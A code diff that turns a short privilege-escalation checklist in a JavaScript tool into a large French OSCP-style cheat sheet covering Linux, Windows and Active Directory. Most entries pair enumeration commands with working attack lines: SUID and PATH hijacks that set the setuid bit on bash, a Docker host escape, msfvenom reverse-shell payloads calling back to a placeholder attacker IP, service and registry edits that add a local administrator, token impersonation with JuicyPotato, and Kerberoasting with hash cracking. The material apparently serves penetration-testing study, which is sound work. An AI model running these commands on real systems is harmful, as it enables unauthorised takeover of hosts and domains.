@@ -76,28 +76,392 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
     };
 
     // --- Checklist Data (Simplified - Could be externalized) ---
-    const CHECKLIST_DATA = {
+    const OSCP_PRIVESC_GUIDE = {
         linux: [
-            { id: 'l1', label: 'Kernel Version Check', details: 'uname -a. Check for known kernel exploits (e.g., Dirty COW, Dirty Pipe).', checked: false },
-            { id: 'l2', label: 'Sudo Permissions', details: 'sudo -l. Look for NOPASSWD, exploitable binaries (GTFOBins).', checked: false },
-            { id: 'l3', label: 'SUID/SGID Binaries', details: 'find / -perm -u=s -type f 2>/dev/null. Check GTFOBins.', checked: false },
-            { id: 'l4', label: 'Capabilities', details: 'getcap -r / 2>/dev/null. Check GTFOBins.', checked: false },
-            { id: 'l5', label: 'Cron Jobs', details: 'ls -l /etc/cron*; cat /etc/crontab. Check for writable scripts/directories.', checked: false },
-            { id: 'l6', label: 'Writable Files/Dirs', details: 'Check /etc/passwd, /etc/shadow, service configs, $PATH.', checked: false },
-            { id: 'l7', label: 'NFS Shares', details: 'showmount -e <target>; cat /etc/exports. Check for no_root_squash.', checked: false },
-            { id: 'l8', label: 'Docker Socket/Group', details: 'Check if user is in docker group or socket is accessible.', checked: false },
+            {
+                id: 'l1',
+                label: 'Kernel Exploits',
+                details: 'Vérifier la version du kernel et chercher des exploits locaux connus.',
+                checked: false,
+                enum: 'uname -a',
+                exploit_guide: 'Utiliser searchsploit, chercher des CVE spécifiques. Compiler et exécuter l\'exploit (instable).',
+                example_exploit: 'searchsploit Linux kernel 4.15'
+            },
+            {
+                id: 'l2',
+                label: 'Sudo Abuse',
+                details: 'Examiner les permissions sudo de l\'utilisateur actuel.',
+                checked: false,
+                enum: 'sudo -l',
+                exploit_guide: 'Utiliser GTFOBins pour identifier des commandes NOPASSWD permettant l\'évasion de privilèges.',
+                example_exploit: 'sudo /usr/bin/nmap --interactive'
+            },
+            {
+                id: 'l3',
+                label: 'SUID/SGID Abuse',
+                details: 'Rechercher les binaires avec les bits SUID/SGID activés.',
+                checked: false,
+                enum: 'find / -perm -u=s -type f 2>/dev/null; find / -perm -g=s -type f 2>/dev/null',
+                exploit_guide: 'Utiliser GTFOBins pour trouver des moyens d\'abuser de ces binaires pour obtenir des privilèges élevés.',
+                example_exploit: 'find . -name exploit -exec /bin/sh -p \; -quit (find SUID)'
+            },
+            {
+                id: 'l4',
+                label: 'Capabilities Abuse',
+                details: 'Lister les capacités des fichiers.',
+                checked: false,
+                enum: 'getcap -r / 2>/dev/null',
+                exploit_guide: 'Utiliser GTFOBins pour identifier les capacités dangereuses.',
+                example_exploit: 'setcap cap_setuid+ep /tmp/evil_bin; /tmp/evil_bin'
+            },
+            {
+                id: 'l5',
+                label: 'Cron Job Abuse',
+                details: 'Analyser les tâches cron pour les vulnérabilités.',
+                checked: false,
+                enum: 'ls -l /etc/cron*; cat /etc/crontab; for user in $(cut -d: -f1 /etc/passwd); do crontab -u "$user" -l 2>/dev/null; done',
+                exploit_guide: 'Modifier les scripts writables ou exploiter les commandes non absolues.',
+                example_exploit: 'echo \'chmod +s /bin/bash\' >> /etc/cron.daily/vulnerable_script'
+            },
+            {
+                id: 'l6',
+                label: 'Writable Files/Directories',
+                details: 'Vérifier les permissions sur les fichiers sensibles et les répertoires.',
+                checked: false,
+                enum: 'ls -ld /etc/passwd /etc/shadow /etc/sudoers*; find / -perm -o+w -type f -print 2>/dev/null; find / -perm -o+w -type d -print 2>/dev/null; echo $PATH',
+                exploit_guide: 'Modifier les fichiers si possible (rare). Exploiter $PATH. Créer des fichiers dans des répertoires writables utilisés par des processus privilégiés.',
+                example_exploit: 'cd /tmp; echo \'#!/bin/bash\nchmod +s /bin/bash\' > update; chmod +x update; export PATH=/tmp:$PATH; sudo update'
+            },
+            {
+                id: 'l7',
+                label: 'NFS Abuse',
+                details: 'Examiner les partages NFS.',
+                checked: false,
+                enum: 'showmount -e <target_ip>; cat /etc/exports',
+                exploit_guide: 'Exploiter l\'option no_root_squash pour agir en tant que root sur le partage monté.',
+                example_exploit: 'mount -t nfs <target_ip>:/ /mnt/nfs; chown root:root /mnt/nfs/evil; chmod +s /mnt/nfs/evil; /mnt/nfs/evil'
+            },
+            {
+                id: 'l8',
+                label: 'Docker Socket/Group Abuse',
+                details: 'Vérifier l\'accès au socket Docker.',
+                checked: false,
+                enum: 'groups $USER; ls -l /var/run/docker.sock',
+                exploit_guide: 'Utiliser Docker pour obtenir un accès root au système hôte.',
+                example_exploit: 'sudo docker run -v /:/hostfs --rm -it alpine chroot /hostfs /bin/sh'
+            },
+            {
+                id: 'l9',
+                label: 'Exploiting PATH Variable',
+                details: 'Si un répertoire dans votre PATH est writable, vous pouvez potentiellement exécuter des commandes privilégiées en plaçant un exécutable malveillant avec le même nom.',
+                checked: false,
+                enum: 'echo $PATH; find / -writable -type d -user $USER 2>/dev/null',
+                exploit_guide: 'Identifier un répertoire writable dans PATH et y placer un exécutable malveillant.',
+                example_exploit: 'cd /tmp; mkdir evilpath; echo \'#!/bin/bash\nchmod +s /bin/bash\' > evilpath/sudo; chmod +x evilpath/sudo; export PATH=/tmp/evilpath:$PATH; sudo -V'
+            },
+            {
+                id: 'l10',
+                label: 'Exploiting Environment Variables',
+                details: 'Certains programmes privilégiés peuvent être influencés par des variables d\'environnement non sécurisées.',
+                checked: false,
+                enum: 'ps aux | grep <process_privilegie>; strings /proc/<pid>/environ',
+                exploit_guide: 'Identifier les variables d\'environnement lues par un processus privilégié et tenter de les manipuler.',
+                example_exploit: 'LD_PRELOAD=/tmp/evil.so privileged_program'
+            },
+            {
+                id: 'l11',
+                label: 'Abusing Shared Libraries',
+                details: 'Si un programme privilégié charge des bibliothèques partagées avec des permissions d\'écriture, elles peuvent être remplacées.',
+                checked: false,
+                enum: 'ldd <programme_privilegie>; find / -name "<nom_lib>.so" -writable -user $USER 2>/dev/null',
+                exploit_guide: 'Créer une bibliothèque partagée malveillante et la faire charger par le programme privilégié.',
+                example_exploit: 'gcc -shared -fPIC evil.c -o evil.so; LD_PRELOAD=/tmp/evil.so privileged_program'
+            },
+            {
+                id: 'l12',
+                label: 'Exploiting Init Scripts/Services',
+                details: 'Vérifier les scripts d\'initialisation ou les fichiers de configuration des services pour les vulnérabilités.',
+                checked: false,
+                enum: 'ls -l /etc/init.d/; cat /etc/init.d/*; ls -l /etc/systemd/system/; cat /etc/systemd/system/*.service',
+                exploit_guide: 'Identifier les scripts ou fichiers de configuration writables ou ceux qui exécutent des commandes non sécurisées.',
+                example_exploit: 'echo \'#!/bin/bash\nchmod +s /bin/bash\' > /etc/init.d/vulnerable_service; chmod +x /etc/init.d/vulnerable_service; service vulnerable_service start'
+            },
+            {
+                id: 'l13',
+                label: 'Abusing File System Permissions (ACLs)',
+                details: 'Vérifier les Access Control Lists (ACLs) des fichiers et répertoires.',
+                checked: false,
+                enum: 'getfacl <fichier_ou_repertoire>',
+                exploit_guide: 'Identifier les ACLs qui permettent à l\'utilisateur actuel de modifier des fichiers appartenant à d\'autres utilisateurs privilégiés.',
+                example_exploit: 'setfacl -m u:$USER:rwx /chemin/fichier_privilegie; echo \'evil_command\' > /chemin/fichier_privilegie'
+            },
+            {
+                id: 'l14',
+                label: 'Exploiting Software Vulnerabilities (Local)',
+                details: 'Rechercher les vulnérabilités dans les logiciels installés (autres que le kernel).',
+                checked: false,
+                enum: 'dpkg -l; rpm -qa',
+                exploit_guide: 'Utiliser searchsploit ou des bases de données de vulnérabilités pour trouver des exploits locaux.',
+                example_exploit: 'searchsploit <nom_du_logiciel> local privilege escalation'
+            },
+            {
+                id: 'l15',
+                label: 'Abusing Systemctl',
+                details: 'Si l\'utilisateur a des droits sudo sur `systemctl`, il peut potentiellement escalader ses privilèges.',
+                checked: false,
+                enum: 'sudo -l | grep systemctl',
+                exploit_guide: 'Utiliser `systemctl` pour exécuter des commandes privilégiées.',
+                example_exploit: 'sudo systemctl start evil.service; cat evil.service (contenant une commande d\'escalade)'
+            },
+            {
+                id: 'l16',
+                label: 'Exploiting PAM (Pluggable Authentication Modules)',
+                details: 'Des configurations PAM incorrectes peuvent potentiellement être exploitées.',
+                checked: false,
+                enum: 'ls -l /etc/pam.d/',
+                exploit_guide: 'Analyser les fichiers de configuration PAM pour des faiblesses (rare).',
+                example_exploit: 'Exploitation spécifique à une mauvaise configuration PAM (très contextuel).'
+            },
+            {
+                id: 'l17',
+                label: 'Abusing Mount Bindings',
+                details: 'Si l\'utilisateur peut monter des répertoires sur des emplacements privilégiés.',
+                checked: false,
+                enum: 'cat /etc/fstab',
+                exploit_guide: 'Monter un répertoire contrôlé par l\'utilisateur sur un emplacement privilégié et y placer des fichiers malveillants.',
+                example_exploit: 'mount --bind /tmp /usr/bin; echo \'chmod +s /bin/bash\' > /usr/bin/bash'
+            },
+            {
+                id: 'l18',
+                label: 'Exploiting Open Redirects/SSRF (Local)',
+                details: 'Certaines applications locales peuvent avoir des vulnérabilités d\'open redirect ou de SSRF qui peuvent être exploitées localement pour obtenir des informations ou exécuter des commandes.',
+                checked: false,
+                enum: 'ps aux | grep <application_locale>',
+                exploit_guide: 'Analyser le comportement de l\'application locale.',
+                example_exploit: 'Exploitation spécifique à l\'application (très contextuel).'
+            },
+            {
+                id: 'l19',
+                label: 'Abusing Package Managers',
+                details: 'Si l\'utilisateur a des droits sudo pour exécuter le gestionnaire de paquets sans restrictions, cela peut mener à une escalade.',
+                checked: false,
+                enum: 'sudo -l | grep apt; sudo -l | grep yum',
+                exploit_guide: 'Utiliser le gestionnaire de paquets pour exécuter des commandes privilégiées (e.g., en installant un package malveillant ou en exécutant des scripts de post-installation).',
+                example_exploit: 'sudo apt install -y --force-yes /tmp/evil.deb'
+            }
         ],
         windows: [
-            { id: 'w1', label: 'System Information', details: 'systeminfo. Check OS version, architecture, hotfixes (compare with WES-NG).', checked: false },
-            { id: 'w2', label: 'User Privileges', details: 'whoami /priv. Look for SeImpersonate, SeBackup, SeAssignPrimaryToken, etc.', checked: false },
-            { id: 'w3', label: 'Unquoted Service Paths', details: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """', checked: false },
-            { id: 'w4', label: 'Weak Service Permissions', details: 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula. Check for SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG.', checked: false },
-            { id: 'w5', label: 'AlwaysInstallElevated', details: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', checked: false },
-            { id: 'w6', label: 'Stored Credentials', details: 'Check registry (Winlogon, PuTTY), config files, PowerShell history, browser data.', checked: false },
-            { id: 'w7', label: 'DLL Hijacking', details: 'Check PATH, monitor process launches (ProcMon).', checked: false },
-            { id: 'w8', label: 'Group Memberships', details: 'net user <username>; net localgroup Administrators. Check for powerful groups (Backup Operators, etc.).', checked: false },
-            { id: 'w9', label: 'Network Shares Access', details: 'Check accessible shares (SYSVOL, NETLOGON, user shares).', checked: false },
-        ]
+            {
+                id: 'w1',
+                label: 'System Information & Known Exploits',
+                details: 'Vérifier la version de l\'OS, l\'architecture et les correctifs installés pour identifier les exploits locaux.',
+                checked: false,
+                enum: 'systeminfo',
+                exploit_guide: 'Comparer la sortie avec WES-NG (Windows Exploit Suggester NG) hors ligne ou chercher des CVE spécifiques.',
+                example_exploit: 'Utiliser WES-NG pour trouver des exploits basés sur les hotfixes manquants.'
+            },
+            {
+                id: 'w2',
+                label: 'Token Impersonation (SeImpersonatePrivilege)',
+                details: 'Vérifier si l\'utilisateur a le privilège SeImpersonatePrivilege.',
+                checked: false,
+                enum: 'whoami /priv',
+                exploit_guide: 'Utiliser des exploits comme Juicy Potato, Rotten Potato, PrintSpoofer pour usurper les tokens d\'autres utilisateurs (souvent SYSTEM).',
+                example_exploit: '.\JuicyPotato.exe -l 9999 -p c:\\windows\\temp\\evil.exe -t * -c {CLSID}'
+            },
+            {
+                id: 'w3',
+                label: 'Backup Operators Privilege (SeBackupPrivilege)',
+                details: 'Vérifier si l\'utilisateur est membre du groupe Backup Operators.',
+                checked: false,
+                enum: 'net user <username>; net localgroup "Backup Operators"',
+                exploit_guide: 'Les membres de Backup Operators peuvent lire les fichiers protégés par le système, y compris les hives du registre (SAM, SYSTEM).',
+                example_exploit: 'Utiliser des outils comme NTBackup ou des scripts PowerShell pour copier les hives du registre.'
+            },
+            {
+                id: 'w4',
+                label: 'Unquoted Service Paths',
+                details: 'Identifier les services avec des chemins non entre guillemets contenant des espaces.',
+                checked: false,
+                enum: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\\\Windows\\\\" | findstr /i /v """',
+                exploit_guide: 'Placer un exécutable malveillant dans un répertoire parent du chemin du service.',
+                example_exploit: 'msfvenom -p windows/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PORT> -f exe -o "C:\\Program Files\\Sous-dossier.exe" (si le chemin est C:\\Program Files\\Sous-dossier\\Service.exe)'
+            },
+            {
+                id: 'w5',
+                label: 'Weak Service Permissions',
+                details: 'Vérifier les permissions sur les services.',
+                checked: false,
+                enum: '.\accesschk.exe -uwcqv "Authenticated Users" * /accepteula',
+                exploit_guide: 'Modifier le chemin d\'exécution d\'un service si l\'utilisateur a les droits (SERVICE_CHANGE_CONFIG).',
+                example_exploit: 'sc config <ServiceName> binPath= "net user exploit Password123 /add && net localgroup Administrators exploit /add && net start <ServiceName>"'
+            },
+            {
+                id: 'w6',
+                label: 'AlwaysInstallElevated',
+                details: 'Vérifier si la politique AlwaysInstallElevated est activée.',
+                checked: false,
+                enum: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
+                exploit_guide: 'Créer et exécuter un fichier MSI malveillant pour exécuter des commandes avec les privilèges SYSTEM.',
+                example_exploit: 'msfvenom -p windows/exec CMD="net user exploit Password123 /add && net localgroup Administrators exploit /add" -f msi -o evil.msi; msiexec /i evil.msi'
+            },
+            {
+                id: 'w7',
+                label: 'Stored Credentials',
+                details: 'Rechercher les informations d\'identification stockées.',
+                checked: false,
+                enum: 'reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions; reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon; dir /a %APPDATA%\\Microsoft\\Windows\\PowerShell\\History.txt; cmdkey /list',
+                exploit_guide: 'Utiliser les informations d\'identification trouvées pour l\'usurpation d\'identité ou la connexion à d\'autres systèmes.',
+                example_exploit: 'runas /user:<username> <command>'
+            },
+            {
+                id: 'w8',
+                label: 'DLL Hijacking',
+                details: 'Identifier et exploiter les vulnérabilités de détournement de DLL.',
+                checked: false,
+                enum: 'Utiliser Process Monitor (ProcMon) pour identifier les DLL manquantes.',
+                exploit_guide: 'Créer une DLL malveillante avec le nom de la DLL manquante et la placer dans un emplacement où l\'application privilégiée la chargera en premier.',
+                example_exploit: 'msfvenom -p windows/dll/reverse_tcp LHOST=<IP_KALI> LPORT=<PORT> -f dll -o hijack.dll'
+            },
+            {
+                id: 'w9',
+                label: 'Group Memberships',
+                details: 'Vérifier l\'appartenance à des groupes privilégiés.',
+                checked: false,
+                enum: 'net user <username>; net localgroup',
+                exploit_guide: 'Exploiter les droits associés aux groupes (e.g., Remote Desktop Users, Distributed COM Users).',
+                example_exploit: 'Si membre de "Remote Desktop Users", activer RDP si désactivé.'
+            },
+            {
+                id: 'w10',
+                label: 'Network Shares Permissions',
+                details: 'Examiner les permissions sur les partages réseau.',
+                checked: false,
+                enum: 'net share; Get-SmbShare | Get-SmbShareAccess',
+                exploit_guide: 'Écrire des exécutables ou modifier des fichiers sur des partages accessibles en écriture qui sont utilisés par des processus privilégiés.',
+                example_exploit: 'copy evil.exe \\\\<target>\\<share>'
+            },
+            {
+                id: 'w11',
+                label: 'Scheduled Tasks',
+                details: 'Lister et analyser les tâches planifiées.',
+                checked: false,
+                enum: 'schtasks /query /fo LIST /v; Get-ScheduledTask | Select-Object TaskName, TaskPath, Author, RunLevel, Principal',
+                exploit_guide: 'Modifier des tâches planifiées si l\'utilisateur a les droits d\'écriture sur le fichier exécutable ou le script associé.',
+                example_exploit: 'Remplacer le binaire d\'une tâche planifiée s\'exécutant en tant que SYSTEM par un payload malveillant.'
+            },
+            {
+                id: 'w12',
+                label: 'Registry Permissions',
+                details: 'Vérifier les permissions sur les clés de registre sensibles.',
+                checked: false,
+                enum: '.\accesschk.exe -kqv "Everyone" HKLM\\System\\CurrentControlSet\\Services; Get-Acl -Path "HKLM:\\System\\CurrentControlSet\\Services\\<ServiceName>" | Format-List',
+                exploit_guide: 'Modifier des clés de registre pour exécuter des commandes privilégiées (e.g., modifier ImagePath d\'un service).',
+                example_exploit: 'reg add "HKLM\\System\\CurrentControlSet\\Services\\<ServiceName>" /v ImagePath /t REG_EXPAND_SZ /d "net user exploit Password123 /add && net localgroup Administrators exploit /add && net start <ServiceName>" /f'
+            },
+            {
+                id: 'w13',
+                label: 'COM Object Hijacking',
+                details: 'Identifier et exploiter les détournements d\'objets COM.',
+                checked: false,
+                enum: 'reg query HKCR\\CLSID /s /f InprocServer32',
+                exploit_guide: 'Remplacer le chemin d\'une DLL pour un objet COM invoqué par une application privilégiée.',
+                example_exploit: 'reg add HKCR\\CLSID\\{CLSID_VULNERABLE}\\InprocServer32 /ve /t REG_SZ /d "C:\\path\\to\\evil.dll" /f'
+            },
+            {
+                id: 'w14',
+                label: 'PowerShell Remoting Abuse',
+                details: 'Si PowerShell Remoting est activé, des informations d\'identification compromises peuvent être utilisées pour l\'exécution à distance.',
+                checked: false,
+                enum: 'Get-PSSessionConfiguration',
+                exploit_guide: 'Utiliser Enter-PSSession avec des informations d\'identification valides.',
+                example_exploit: 'Enter-PSSession -ComputerName <target> -Credential <creds>'
+            },
+            {
+                id: 'w15',
+                label: 'Local Group Policy Abuse',
+                details: 'Examiner les stratégies de groupe locales.',
+                checked: false,
+                enum: 'gpresult /r',
+                exploit_guide: 'Identifier les paramètres de stratégie de groupe locaux qui pourraient être exploités (e.g., scripts de démarrage).',
+                example_exploit: 'Modifier des scripts de démarrage locaux si les permissions le permettent.'
+            }
+        ],
+        activeDirectory: {
+            guide: "L'escalade de privilèges dans Active Directory (AD) se concentre sur l'exploitation des mauvaises configurations, des permissions excessives et des vulnérabilités au sein du domaine. Une énumération approfondie avec des outils comme `BloodHound`, les cmdlets PowerShell AD et `ldapsearch` est essentielle.",
+            techniques: [
+                {
+                    name: 'Group Policy Abuse (GPO)',
+                    enum: 'gpresult /r (sur la machine cible jointe au domaine); Get-GPO -All (avec les outils RSAT)',
+                    details: 'Identifier les GPOs appliquées à l\'utilisateur ou à la machine. Rechercher les GPOs modifiables par des utilisateurs à bas privilèges qui peuvent être utilisés pour exécuter des scripts malveillants (Computer Startup Scripts, User Logon Scripts).',
+                    exploit_guide: 'Modifier un GPO writable pour exécuter un script malveillant. Cela nécessite souvent les outils RSAT.',
+                    example_exploit: 'Utiliser `Set-GPO` pour modifier les paramètres d\'un GPO et y ajouter un script de démarrage malveillant.'
+                },
+                {
+                    name: 'Password Reuse (Local -> Domain)',
+                    details: 'Essayer les mots de passe locaux compromis sur les comptes de domaine.',
+                    exploit_guide: 'Utiliser des outils comme `CrackMapExec` pour tester les identifiants sur différents services et machines du domaine (SMB, WinRM, etc.).',
+                    enum: 'N/A (nécessite des identifiants locaux compromis)'
+                },
+                {
+                    name: 'Kerberoasting',
+                    enum: 'GetUserSPNs -request (avec PowerView); Rubeus.exe kerberoast /domain:<domain> /user:<user> /outfile:hashes.txt',
+                    details: 'Demander des tickets Kerberos pour les Service Principal Names (SPNs). Les hashs TGS peuvent être crackés hors ligne pour obtenir les mots de passe des comptes de service, qui peuvent avoir des privilèges élevés.',
+                    exploit_guide: 'Utiliser `hashcat` ou `John the Ripper` pour cracker les hashs TGS extraits avec les outils d\'énumération.',
+                    example_exploit: 'hashcat -m 13100 hashes.txt wordlist.txt'
+                },
+                {
+                    name: 'AS-REP Roasting',
+                    enum: 'Get-DomainUser -PreauthNotRequired | select samaccountname (avec PowerView); Rubeus.exe asreproast /domain:<domain> /format:john /outfile:hashes.txt',
+                    details: 'Identifier les utilisateurs dont l\'option "Do not require Kerberos pre-authentication" est activée. Leurs hashs Kerberos peuvent être demandés sans mot de passe et crackés hors ligne.',
+                    exploit_guide: 'Utiliser `hashcat` ou `John the Ripper` pour cracker les hashs AS-REP extraits.',
+                    example_exploit: 'john --format=krb5asrep hashes.txt --wordlist=password.lst'
+                },
+                {
+                    name: 'ACL Abuse (Permissions sur les objets AD)',
+                    enum: 'Get-ObjectAcl -Identity "<DN_Objet_AD>" | Format-List (avec PowerView); ldapsearch -x -h <dc_ip> -D "<user>@<domain>" -w "<password>" -b "<base_dn>" -s sub "(objectClass=*)" dacl',
+                    details: 'Examiner les Access Control Lists (ACLs) sur les objets AD (utilisateurs, groupes, GPOs, OUs). Rechercher les permissions d\'écriture ou de contrôle excessives accordées à des utilisateurs à bas privilèges qui pourraient permettre de modifier des attributs sensibles.',
+                    exploit_guide: 'Modifier les attributs d\'objets AD si les permissions le permettent (e.g., ajouter un utilisateur à un groupe privilégié). Utiliser des outils comme `Set-ObjectAcl` (PowerView) ou des requêtes LDAP modifiées.',
+                    example_exploit: 'Set-ObjectAcl -TargetIdentity "CN=LowPrivUser,CN=Users,DC=domain,DC=com" -PrincipalIdentity "<user_sid>" -Rights "WriteProperty" -Properties member -AceType "Allow"'
+                },
+                {
+                    name: 'Exploitation des relations de confiance (Trusts)',
+                    details: 'Si le domaine actuel a des relations de confiance avec d\'autres domaines, il peut être possible d\'exploiter ces relations pour obtenir un accès privilégié dans le domaine actuel (Cross-Domain Attacks).',
+                    exploit_guide: 'Utiliser des outils comme `Mimikatz` pour générer des tickets inter-domaines si des identifiants d\'un domaine de confiance ont été compromis. Énumérer les relations de confiance avec `nltest /domain_trusts`.',
+                    enum: 'nltest /domain_trusts'
+                },
+                {
+                    name: 'SID History Injection',
+                    details: 'Si un attaquant contrôle un compte dans un domaine de confiance, il peut potentiellement injecter l\'historique des SID d\'un groupe privilégié dans le compte compromis, lui accordant ainsi des privilèges dans le domaine actuel.',
+                    exploit_guide: 'Utiliser des outils comme `Mimikatz` pour injecter l\'historique des SID.',
+                    enum: 'N/A (nécessite un compte compromis dans un domaine de confiance)'
+                },
+                {
+                    name: 'Golden Ticket',
+                    details: 'Si la clé KRBTGT du domaine est compromise, un attaquant peut forger des tickets Kerberos (TGT) pour n\'importe quel utilisateur, y compris Administrator.',
+                    exploit_guide: 'Nécessite l\'obtention de la clé KRBTGT (souvent via Mimikatz sur un contrôleur de domaine compromis). Utiliser des outils comme `Mimikatz` pour forger le Golden Ticket.',
+                    enum: 'N/A (nécessite une compromission préalable du contrôleur de domaine)'
+                },
+                {
+                    name: 'Silver Ticket',
+                    details: 'Similaire au Golden Ticket, mais au lieu de forger un TGT pour n\'importe quel utilisateur, un Silver Ticket forge un TGS pour un service spécifique (e.g., CIFS sur un serveur). Nécessite le hash du compte de service.',
+                    exploit_guide: 'Obtenir le hash du compte de service (via Mimikatz ou Kerberoasting) et utiliser des outils comme `Mimikatz` pour forger le Silver Ticket.',
+                    enum: 'GetUserSPNs -request (pour identifier les comptes de service)'
+                },
+                {
+                    name: 'DCShadow',
+                    details: 'Une technique qui permet à un attaquant avec des privilèges suffisants dans le domaine de pousser des modifications malveillantes à Active Directory en enregistrant un contrôleur de domaine malveillant.',
+                    exploit_guide: 'Utiliser des outils comme `Impacket` pour effectuer une attaque DCShadow.',
+                    enum: 'N/A (nécessite des privilèges spécifiques dans le domaine)'
+                },
+                {
+                    name: 'DCSync',
+                    details: 'Une technique utilisée par les attaquants pour récupérer les hashs de mot de passe de tous les utilisateurs du domaine en se faisant passer pour un contrôleur de domaine légitime.',
+                    exploit_guide: 'Utiliser des outils comme `Mimikatz` pour effectuer une attaque DCSync. Nécessite des privilèges élevés dans le domaine (souvent Domain Admins ou équivalent).',
+                    enum: 'N/A (nécessite des privilèges élevés dans le domaine)'
+                }
+            ]
+        }
     };
 
     // --- Suspicious Patterns Definition ---
